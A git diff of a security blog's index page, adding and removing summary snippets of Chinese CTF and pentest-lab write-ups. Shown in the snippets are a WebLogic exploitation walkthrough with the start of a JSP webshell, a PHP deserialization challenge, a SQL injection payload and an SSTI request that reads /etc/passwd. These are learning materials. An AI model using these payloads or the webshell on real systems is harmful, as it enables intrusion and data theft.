@@ -110,6 +110,36 @@
         alt="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp"
         title="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp" /></a></div><h1 class="home-title">ThnPinkman's blog</h1><div class="home-subtitle"><div id="id-1" class="typeit"></div></div><div class="links"></div></div>
 <article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/">红日靶场2</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>内网渗透</a></span></div><div class="content">红日靶场2 拓扑图 默认密码：1qaz@WSX
+0x01环境搭建 我是参考此视频
+https://www.bilibili.com/video/BV1De4y1a7Ps/?spm_id_from=333.337.search-card.all.click&vd_source=cf73ac8de9b7c0322b1bccf77de91c5dnat模式分配111段
+自定义一个10.10.10.x 的网络 我命名为VMnet5
+进入WEB中，来到C:\Oracle\Middleware\user_projects\domains\base_domain\bin 路径 以管理员权限执行startWebLogic
+0x02信息收集 端口扫描 这个命令显示更详细，可以看到不少的服务都打开了
+漏洞探测 80端口是空白，这边先重点关注一下7001 Oracle WebLogic Server
+跳转到404
+尝试使用WeblogicScan脚本探测漏洞：
+python3 WeblogicScan.py -u 192.168.111.80 -p 7001 有合适的cve
+github准备好exp工具进行利用
+-u 检测 -f上传木马
+得到一个url 可以直接执行命令
+上帝视角去看靶机的shell.jsp的文件位置
+C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\wls-wsat\54p17w\war
+传入马比较棘手且比赛也没有上帝视角，另寻其他方法
+getShell 找到个工具weblogic漏洞检测工具
+输入url就能扫漏洞，然后命令执行，最好用的是可以文件上传，这里传入一个蚁剑的jsp马
+&lt;%!class U extends ClassLoader {U(ClassLoader c) {super(c);}public Class g(byte[] b) {return super.defineClass(b, 0, b.length);}}public byte[] base64Decode(String str) throws Exception {try {Class clazz = Class.</div><div class="post-footer">
+        <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/ctf/0xgame2022/">0xgame2022</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">do_u_like_pop &lt;?php highlight_file(__FILE__); class Apple{ public $var; public function __wakeup(){ $this-&gt;var-&gt;value; } public function __invoke(){ echo $this-&gt;var; } } class Banana{ public $source=&#34;pop.php&#34;; public $str; public function __toString(){ echo file_get_contents($this-&gt;source); return &#39;do u like pop?&#39;; } public function __construct(){ $this-&gt;source = &#34;flag in flag.php&#34;; echo 123; } } class Cherry{ public $p; public $o; public function __construct(){ $this-&gt;o = &#39;pop song&#39;; } public function __get($key){ ($this-&gt;p)(); } } if(isset($_GET[&#39;pop&#39;])){ @unserialize($_GET[&#39;pop&#39;]); } 简单的反序列化链子</div><div class="post-footer">
+        <a href="/posts/ctf/0xgame2022/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/posts/ctf/2020%E7%BE%8A%E5%9F%8E%E6%9D%AF/">2020羊城杯</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
 </span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">WEB easycon 打开就是
@@ -170,39 +200,6 @@ name=1&#39;and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ name=1&#3
 &lt;?php mt_srand(1145146); mt_rand(); echo mt_rand(); ?</div><div class="post-footer">
         <a href="/posts/ctf/buuctf-newstarctf/">Read More</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/ctf/catctf/">CatCTF</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">MISC Cat_Jump 尝试了去打开玩游戏但是没搞定，直接strings了 非预期
-strings xxx | grep CatCTF{
-Peekaboo MeowMeow CatCTF{CAT_GOES_MEOW} ,010打开看ascii的形状，ctfshow有一道这样的题
-miao~ strings 了一下，出现这一堆
-网上有些题是 直接看属性有东西，exiftool没发现啥
-foremost 出 wav ，频谱图
-CatCTF 某个密码
-试试jpg隐写的工具，都没试出来，卡这里了，wav我也去尝试了silenteye没结果
-正确是DeepSound工具解密，之前没用过 ,选择wav输入密码，得到个flag.txt
-在他默认保存路径可以打开flag.txt
-然后兽语解密
-CatCat 这个文件名一看就猜测是 rabbit加密 和base91
-rabbit的密钥，jpg用010打开搜索pass
-密钥是catflag
-然后base91
-这一看就是Ook解密，将cat替换成Ook
-CatchCat 可爱的猫猫走丢了，还好猫猫有GPS定位装置，我们陆陆续续在终端收到了GPS数据，你能帮忙找到可爱的猫猫吗？
-给了一堆GPGGA的数据，找了很久没有找到合适的网站
-想着提取出经纬度
-f= open(&#39;1.txt&#39;) lines = f.readlines() for line in lines: print(line[17:30]+&#39;,&#39;+line[33:47]) 刚开始用gnuplot画个图，但是画出来看不出啥，想着去用谷歌地球画路线，不过需要KML文件
-&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt; &lt;kml xmlns=&#34;http://www.opengis.net/kml/2.2&#34;&gt; &lt;Document&gt; &lt;name&gt;KML&lt;/name&gt; &lt;description&gt;KML&lt;/description&gt; &lt;Placemark&gt; &lt;name&gt;[2011/2/1 19:59:14]&lt;/name&gt; &lt;description&gt;line&lt;/description&gt; &lt;LineString&gt; &lt;coordinates&gt; 3416.48590278,10856.86623887 3416.48590278,10856.86623887 .......................... &lt;/coordinates&gt; &lt;/LineString&gt; &lt;/Placemark&gt; &lt;/Document&gt; &lt;/kml&gt; 将经纬度替换后，导入谷歌地球</div><div class="post-footer">
-        <a href="/posts/ctf/catctf/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/ctf/ciscn2023%E5%88%9D%E8%B5%9B/">ciscn2023初赛</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">go_session GET /admin?name={%25%20include%20c.Request.Header.Accept.0%20%25} HTTP/1.1Host: 123.56.99.60:12488Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36Accept: /etc/passwdAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: session-name=MTY4NTE2NjEzNnxFXy1CQkFFQkEwOWlhZ0hfZ2dBQkVBRVFBQUFqXzRJQUFRWnpkSEpwYm1jTUJnQUVibUZ0WlFaemRISnBibWNNQndBRllXUnRhVzQ9fEDXM_0GyRu_LshoipBIWA6dvJ8u4d-oTgM7OGlKvC2SConnection: close 实现任意文件读取
-还是</div><div class="post-footer">
-        <a href="/posts/ctf/ciscn2023%E5%88%9D%E8%B5%9B/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
 </article><ul class="pagination"><li class="page-item ">
                     <span class="page-link">
                         <a href="/">1</a>
@@ -223,7 +220,7 @@ f= open(&#39;1.txt&#39;) lines = f.readlines() for line in lines: print(line[17:
                     <span class="page-link" aria-hidden="true">&hellip;</span>
                 </li><li class="page-item ">
                     <span class="page-link">
-                        <a href="/page/7/">7</a>
+                        <a href="/page/8/">8</a>
                     </span>
                 </li></ul></div></div>
             </main><footer class="footer">
